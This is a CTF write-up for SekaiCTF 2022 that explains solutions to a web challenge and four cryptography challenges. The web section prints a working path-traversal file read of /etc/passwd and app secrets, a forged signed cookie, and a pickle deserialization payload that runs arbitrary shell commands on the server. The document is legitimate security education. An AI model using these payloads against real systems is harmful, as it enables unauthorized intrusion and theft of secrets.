+++
title = "Writeup: SekaiCTF 2022"
publishDate = "2022-10-02T14:53:00+00:00"
math = true
+++

- Website: https://ctf.sekai.team/
- CTFTime: https://ctftime.org/event/1619

## Bottle Poem (Web)

> Come and read poems in the bottle.
>
> No bruteforcing is required to solve this challenge. Please do not use scanner
> tools. Rate limiting is applied. Flag is executable on server.
>
> Author: bwjy
>
> `http://bottle-poem.ctf.sekai.team`

Opening the link in a browser shows a simple index page with links to poems:

- `http://bottle-poem.ctf.sekai.team/show?id=spring.txt`
- `http://bottle-poem.ctf.sekai.team/show?id=Auguries_of_Innocence.txt`
- `http://bottle-poem.ctf.sekai.team/show?id=The_tiger.txt`

Opening any of them returns a simple text file with a poem. The URL seems
suspicious, so let's try reading arbitrary files:

```
$ curl http://bottle-poem.ctf.sekai.team/show?id=/etc/passwd
root:x:0:0:root:/root:/bin/bash
[...]
```

Great! But this doesn't seem to be too useful on its own, no flag file is
immediately available. It also seems to refuse to read executables like
`/bin/bash`. The hint says that the flag is "executable", which suggests
we are supposed execute commands, not just read arbitrary files.

Moving on, let's get some more details on the webserver process itself:

```
$ curl http://bottle-poem.ctf.sekai.team/show?id=/proc/self/cmdline -o- | tr \\0 \\n
python3
-u
/app/app.py

$ curl http://bottle-poem.ctf.sekai.team/show?id=/app/app.py
from bottle import route, run, template, request, response, error
from config.secret import sekai
import os
import re


@route("/")
def home():
    return template("index")


@route("/show")
def index():
    response.content_type = "text/plain; charset=UTF-8"
    param = request.query.id
    if re.search("^../app", param):
        return "No!!!!"
    requested_path = os.path.join(os.getcwd() + "/poems", param)
    try:
        with open(requested_path) as f:
            tfile = f.read()
    except Exception as e:
        return "No This Poems"
    return tfile


@error(404)
def error404(error):
    return template("error")


@route("/sign")
def index():
    try:
        session = request.get_cookie("name", secret=sekai)
        if not session or session["name"] == "guest":
            session = {"name": "guest"}
            response.set_cookie("name", session, secret=sekai)
            return template("guest", name=session["name"])
        if session["name"] == "admin":
            return template("admin", name=session["name"])
    except:
        return "pls no hax"


if __name__ == "__main__":
    os.chdir(os.path.dirname(__file__))
    run(host="0.0.0.0", port=8080)

$ curl http://bottle-poem.ctf.sekai.team/show?id=/app/config/secret.py
sekai = "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"
```

We have a hidden endpoint at `/sign`, and we can easily forge signed cookies as
we have obtained the signing secret already.

```
#!/usr/bin/env python3

from bottle import response

response.set_cookie('name', {'name': 'admin'}, secret="Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu")
print(f'Cookie: {response.headerlist[1][1]}')
# Cookie: name="!rsOwvUb6jllVHQVOPlZv5w==?gAWVFwAAAAAAAACMBG5hbWWUfZRoAIwFYWRtaW6Uc4aULg=="

$ curl http://bottle-poem.ctf.sekai.team/sign -H 'Cookie: name="!rsOwvUb6jllVHQVOPlZv5w==?gAWVFwAAAAAAAACMBG5hbWWUfZRoAIwFYWRtaW6Uc4aULg=="'
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Sekai's boooootttttttlllllllleeeee</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="text-white bg-zinc-800 container px-4 mx-auto text-center h-screen box-border flex justify-center item-center flex-col">
	Hello, you are admin, but it’s useless.
</body>
</html>
```

No dice. The documentation for the `set_cookie` method used above mentions that
it can "store any pickle-able object". Python pickles can encode arbitrary
python values, and when used incorrectly (especially when decoding
attacker-controled values), it can lead to arbitrary code execution.

We can now start setting up for arbitrary command execution:[^pickle-rce-ref]

[^pickle-rce-ref]: Copied from https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd

```
#!/usr/bin/env python3

from bottle import response
import sys

command = sys.argv[1]

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

response.set_cookie('name', {'name': 'admin', 'v': PickleRce()}, secret="Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu")
print(f'Cookie: {response.headerlist[1][1]}')

$ time curl http://bottle-poem.ctf.sekai.team/sign -H "$(./sign.py 'sleep 5')" -o /dev/null

real	0m5.492s
user	0m0.095s
sys	0m0.036s
```

It works! While we can't get our command outputs directly, we can redirect
outputs to some file in `/tmp` and read them back afterwards with the `/show`
endpoint.

```
$ curl http://bottle-poem.ctf.sekai.team/sign -H "$(./sign.py 'ls > /tmp/nevinevi')" -o /dev/null
$ curl http://bottle-poem.ctf.sekai.team/show?id=/tmp/nevinevi
app.py
config
poems
views
```

> there were multiple instances of this challenge running at any given time, so
> we had to repeat the read request multiple times in until it was routed to the
> same instance that we originally ran the command in.
>
> I assume you could also set up a proper reverse shell, but I didn't want to
> bother standing up infrastructure or opening ports on my end.

We now have the ability to execute arbitrary commands and read their outputs. We
can now explore the filesystem and obtain the flag.

```
$ curl http://bottle-poem.ctf.sekai.team/sign -H "$(./sign.py 'find / > /tmp/nevinevi')" -o /dev/null
$ curl http://bottle-poem.ctf.sekai.team/show?id=/tmp/nevinevi | grep flag
[...]
/flag
$ curl http://bottle-poem.ctf.sekai.team/sign -H "$(./sign.py '/flag > /tmp/nevinevi')" -o /dev/null
$ curl http://bottle-poem.ctf.sekai.team/show?id=/tmp/nevinevi
SEKAI{W3lcome_To_Our_Bottle}
```

## Time Capsule (Cryptography)

> I have encrypted a secret message with this super secure algorithm and put it
> into a Time Capsule. Maybe nobody can reveal my secret without a time
> machine...
>
> Author: sahuang
>
> [chall.py](time-capsule/chall.py) [flag.enc](time-capsule/flag.enc)

We are given an encryption program and a ciphertext. The encryption program has
two distinct phases that do not share state, so we will tackle each phase
separately, in reverse order.

The second phase seems to be mainly an XOR cipher, with a keystream generated
with `random.randrange()` seeded with the value of `now = time.now()` padded to
18 characters. The time is XORed with the constant `0x42` and is also appended
to the ciphertext.

Since the random key generation seed is right there, we can recover it and rever
this phase easily.

```
now = xor(data[-18:], 0x42)
enc = data[:-18]

random.seed(now)
key = [random.randrange(256) for _ in enc]
enc = xor(enc, key)
```

At this stage, the challenge ciphertext decrypts to
`5!K3rn{T_5SA!}0ypC11uu__E__3j5LFI0Esr0m_1!1`.

Next, we need to reverse the first phase. This phase generates an 8-byte random
key and applies some `encrypt_stage_one()` function 42 times with that key.

The key generation function generates 8 random unique bytes. Then the
`encrypt_stage_one()` function takes the key, orders it by value (but maintains
the original index), and uses this index order to shuffle the message bytes
around. That is, given some key like `[13, 17, 8, 1, 2, 3, 4, 5]`, it results in
indices like `[(1, 3), (2, 4), (3, 5), (4, 6), (5, 7), (8, 2), (13, 0), (17,
1)]`. It then looks at the original index `i` of each key to append the
`i[0]`th, `i[0]+8`th, `i[0]+16`th character and so on, followed by the `i[1]`th,
`i[1]+8`th, `i[1]+16` character and so on.

As the second phase only cares about the relative order of the key, and not the
actual values, the key space is not $256^8$, but actually much smaller, at $8! =
40320$. As the keyspace is small, we can brute force the key to obtain the flag.

```
def decrypt(message, key):
    size = len(message)
    out = [0] * size
    for i in key:
        for j in range(i, size, len(key)):
            out[j] = message[0]
            message = message[1:]
    return bytes(out)

for p in permutations(range(8)):
    dec = enc
    for _ in range(42):
        dec = decrypt(dec, p)
    if dec.startswith(b'SEKAI{'):
        break
```

```
$ time ./solve.py
[*] dec: 5!K3rn{T_5SA!}0ypC11uu__E__3j5LFI0Esr0m_1!1
[+] brute: (6, 3, 7, 4, 2, 1, 0, 5)
[+] SEKAI{T1m3_15_pr3C10u5_s0_Enj0y_ur_L1F5!!!}

real    0m18.601s
user    0m18.467s
sys     0m0.147s
```

[solve.py](time-capsule/solve.py)

## FaILProof (Cryptography)

> I have designed a failproof encryption system with possibly arbitrarily small
> public keys. I will be as famous as Et Al one day, but only if I can somehow
> figure out a decryption mechanism...
>
> Author: deut-erium
>
> `nc challs.ctf.sekai.team 3001`
>
> [source.py](failproof/source.py)

One of the first things we notice is that the challenge provides a server,
intead of providing a single key-ciphertext pair, despite being entirely
non-interactive. This will come in handy later.

This server first generates a 16-byte secret key, and SHA256s the secret key
repeatedly to create a 128x256-bit public key. In other words,

$$
\mathrm{Pubkey} =
\begin{pmatrix}
  \mathrm{SHA256}^{1}(\mathrm{secret}) \\\
  \vdots \\\
  \mathrm{SHA256}^{128}(\mathrm{secret}) \\\
\end{pmatrix}
$$

It then encrypts every 64-byte (256-bit) chunk of the message `msg[i]`
independently using this public key. Encryption is performed by computing
`happiness(msg[i] & pubkey[i])` for each pubkey, where `happiness` is turns
out to be popcount. That is,

$$
\mathrm{C}_{i,j} = \mathrm{popcnt}(\mathrm{Pubkey_j} \\mathbin{\\&} \mathrm{msg_i})
$$

This can be more concisely be written as

$$
\mathrm{C_i} = \mathrm{Pubkey} \times \mathrm{msg_i}
$$

Since we need to find `msg`, this feels like a straightforward linear algebra
problem, but we do not have enough information. Looking closely, we are only
given 128 independent equations (public keys) but we have 256 unknowns (bits per
message chunk).

To remedy this, we can just connect to the server twice, obtaining two sets 128
independent equations. We can then concatenate the public keys and ciphertexts
and solve the system of equations to obtain the flag.

$$
\begin{pmatrix}
  \mathrm{C_{a,i}} \\\
  \mathrm{C_{b,i}} \\\
\end{pmatrix} =
\begin{pmatrix}
  \mathrm{Pubkey_a} \\\
  \mathrm{Pubkey_b} \\\
\end{pmatrix}
\times \mathrm{msg_i}
$$

```
$ ./solve.sage
[+] Opening connection to challs.ctf.sekai.team on port 3001: Done
[*] Closed connection to challs.ctf.sekai.team port 3001
[+] Opening connection to challs.ctf.sekai.team on port 3001: Done
[*] Closed connection to challs.ctf.sekai.team port 3001
[+] SEKAI{w3ll_1_gu355_y0u_c4n_4lw4y5_4sk_f0r_m0r3_3qu4t10n5_wh3n_n0_0n3s_l00k1ng}
```

[solve.sage](failproof/solve.sage)

## Secure Image Encryption (Cryptography)

> I think this permutation-based image encryption scheme is so secure that
> nobody can read anything from it!
>
> Author: Yanhu1 & sahuang
>
> `http://secure-image-encryption.ctf.sekai.team`
>
> [server-player.py](secure-image-encryption/server-player.py)

The webserver accepts two 256x256 images, converts them to grayscale, and
applies the same encryption function to each image as well as the flag. The
exact implementation of the encryption function is not provided, but according
to a helfpul comment, it is purely permutation-only.

As the encryption is permutation-only, we could reverse the encryption if we
could somehow obtain the original pixel position of every output pixel. We might
be able to do this by creating an image where every pixel is a distinct color,
keeping track of where each pixel went post-encryption to build a reverse
mapping.

However, our images are converted to grayscale before being encrypted, so we
only have 256 distinct colors we can use to build this reverse mapping when we
need 256x256 distinct values. However, as the server conveniently encrypts two
images for us, we can build the reverse mapping for the x and y coordinates
separately.

That is, we generate two images like so:
[generate.go](secure-image-encryption/generate.go)

![horizontal](secure-image-encryption/horiz.png)

![vertical](secure-image-encryption/vert.png)

Where the grayscale value of each pixel is its x or y coordinate value,
respectively. Once we submit the above images, we obtain encryptions like the
following:

![horizontal](secure-image-encryption/horiz-enc.png)

![vertical](secure-image-encryption/vert-enc.png)

![flag](secure-image-encryption/flag-enc.png)

Given the above, we can build a reverse-x map and reverse-y map from the first
two images, eg.  `reverse_y[i, j] = horiz_encrypted[i, j]` and `reverse_x[i, j]
= vert_encrypted[i, j]`. Once we have built the two maps, we can apply the reverse
mapping to the third image to obtain the flag.

```
$ go run solve.go horiz-enc.png vert-enc.png flag-enc.png > flag.png
```

![flag](secure-image-encryption/flag.png)

[solve.go](secure-image-encryption/solve.go)

## Robust CBC (Cryptography)

> RCBC is a secure MAC that is robust to all attacks. Try to break it!
>
> Author: sahuang & Yanhu1
>
> [robust_cbc](robust-cbc/robust_cbc) [robust_cbc.go](robust-cbc/robust_cbc.go)

> I got 3rd solve on this problem! It might not be much, but it's my first time
> being anywhere close to the first few people to solve any challenge, so I'm a
> bit proud.

The challenge implements something like CBC-MAC with Camellia as its block
cipher, but with a few twists:

- The message is PKCS#7 padded, but only when it is not already a multiple of
  the block size.
- The final block is not used as the MAC as-is. Instead:
  - If the message is a multiple of the block size, the most significant 63 bits
    are returned as the MAC.
  - If the message is not a multiple if the block size, the least significant 63
    bits are returned as the MAC.
- All queries must contain the string `SEKAI`.
- We can query the MAC oracle three times before chosing a message and forging
  its MAC tag.


Unlike standard PKCS#7 padding, this challenge leaves correctly-sized messages
as-is instead of adding a full block of padding. This might have allowed a
trivial attack as `"SEKAI"` and `"SEKAI" + [0x0b]*0x0b` would result in the same
final block, and thus the same MAC tag. This does not work, however, because the
MAC tag is not the raw final block, but a truncation of the final block, and the
unpadded-padded pair of messages would have selected distinct portions of the
final block to truncate.

Similarly, we could have performed the usual message extension
attack[^wiki-cbc-length] given two message-MAC pairs `m1, c1, m2, c2`, by
setting `m3 = m1 || xor(m2[:16], c1) || m2[16:], c3 = c2`. However, because the
state is truncated before being returned as the MAC, we do not know the full MAC
state before it is returned to us as the MAC tag to perform this attack.

We can, however, obtain the majority of the final block's bits by sending a
unpadded-padded message pair. They both result in the same pre-truncation final
block, and the server would provide us the upper and lower 63 bits of the final
CBC block. No matter what we do, it seems impossible to obtain the middle two
bits, but since there are only two unknown bits, we can guess their value and we
will be right 1/4 of the time.

Once we have a guess for the final block's value, we can query the oracle a
third time with any arbitrary message to performt he length extension attack.
More specifically, `m1 = padded message; c1 = full block guess; m2 = third
message; c2 = third message MAC; m3 = m1 || xor(m2[:16], c1) || m2[16:]; c3 =
c2`.

Since we are guessing two bits of the full intermediate block, we might have to
try a few times before obtaining the flag.

[^wiki-cbc-length]: https://en.wikipedia.org/wiki/CBC-MAC#Security_with_fixed_and_variable-length_messages

```
$ ./solve.py
[+] Opening connection to challs.ctf.sekai.team on port 7000: Done
[*] Closed connection to challs.ctf.sekai.team port 7000
[+] Opening connection to challs.ctf.sekai.team on port 7000: Done
[+] Hmmm the scheme seems broken. Here is your flag: SEKAI{TrCBC_15_VuLn3r4bL3_70_len_4tt4cK}
[*] Closed connection to challs.ctf.sekai.team port 7000
```

[solve.py](robust-cbc/solve.py)
